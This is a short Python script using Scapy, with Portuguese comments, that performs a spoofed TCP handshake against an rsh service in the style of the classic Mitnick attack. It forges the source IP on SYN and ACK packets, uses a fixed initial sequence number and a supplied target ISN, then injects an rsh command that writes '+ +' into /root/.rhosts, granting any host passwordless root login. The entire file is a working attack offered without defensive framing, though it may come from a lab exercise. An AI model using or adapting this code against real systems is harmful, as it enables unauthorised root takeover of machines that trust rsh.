from scapy.all import *

def send_spoofed_syn(target_ip, spoofed_ip, client_port, server_port):
    print(f"--- Sending Spoofed SYN Packet ---")
    
    # Usando um número inteiro fixo e absoluto para o Scapy conseguir somar +1 depois
    spoofed_isn = 123456789
    
    syn_packet = IP(src=spoofed_ip, dst=target_ip) / TCP(sport=client_port, dport=server_port, flags='S', seq=spoofed_isn)
    
    send(syn_packet, verbose=0)
    print(f"[+] Spoofed SYN sent with ISN: {spoofed_isn}")
    return spoofed_isn

def complete_handshake_and_inject(target_ip, spoofed_ip, client_port, server_port, my_seq, target_isn):
    print("\n--- Completing Handshake and Injecting Payload ---")
    
    # Agora a matemática funciona perfeitamente
    ack_num = target_isn + 1
    my_next_seq = my_seq + 1

    # 1. Enviar pacote ACK final
    ack_packet = IP(src=spoofed_ip, dst=target_ip) / TCP(sport=client_port, dport=server_port, flags='A', seq=my_next_seq, ack=ack_num)
    send(ack_packet, verbose=0)
    print(f"[+] Spoofed ACK sent (seq={my_next_seq}, ack={ack_num}). Connection established!")

    # 2. Construir Payload RSH
    # Ajustado para gravar exatamente em /root/.rhosts
    payload = b"0\x00root\x00root\x00echo + + > /root/.rhosts\x00"

    # 3. Injetar Payload
    push_packet = IP(src=spoofed_ip, dst=target_ip) / TCP(sport=client_port, dport=server_port, flags='PA', seq=my_next_seq, ack=ack_num) / payload
    send(push_packet, verbose=0)
    print(f"[+] Payload injected: 'echo + + > /root/.rhosts'")